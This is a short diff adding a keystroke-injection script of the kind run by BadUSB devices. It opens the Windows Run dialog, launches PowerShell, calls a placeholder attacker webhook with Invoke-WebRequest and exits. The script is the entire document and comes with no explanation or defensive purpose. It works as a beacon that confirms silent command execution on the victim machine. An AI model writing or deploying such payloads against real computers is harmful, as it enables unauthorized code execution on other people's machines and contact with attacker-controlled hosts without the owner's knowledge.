@@ -1,0 +1,7 @@
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 1400
+STRING Invoke-WebRequest -Uri <YOUR_WEBHOOK_URL_HERE> -Method GET;exit
+ENTER
